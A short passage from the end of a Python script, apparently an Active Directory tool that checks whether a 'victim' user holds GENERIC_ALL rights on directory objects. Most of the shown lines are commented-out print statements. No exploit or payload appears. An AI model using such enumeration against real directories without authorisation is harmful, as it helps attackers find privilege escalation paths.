                        #print(f"Victim ({args.username}) has GENERIC_ALL on: {target_name}")
                        #print(f"Access Mask: {hex(mask)}")
                        #found_any = True
            #except:
                #continue
    #if not found_any:
        #print('nothing')
if __name__ == "__main__":
    main()
